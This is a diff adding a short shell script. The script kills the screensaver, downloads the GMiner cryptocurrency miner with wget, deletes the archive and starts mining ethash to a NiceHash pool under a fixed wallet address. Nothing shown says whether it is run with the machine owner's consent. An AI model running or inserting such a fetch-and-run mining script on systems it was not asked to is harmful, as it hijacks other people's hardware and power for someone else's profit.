@@ -1,0 +1,6 @@
+killall xscreensaver
+
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.47/gminer_2_47_linux64.tar.xz
+tar -xvf gminer_2_47_linux64.tar.xz
+rm -f gminer_2_47_linux64.tar.xz
+./miner --algo ethash --server daggerhashimoto.usa.nicehash.com:3353 --user 3GyGjRsX3t8axeizmetLoneBwazCp6GNRf.t1 --proto stratum
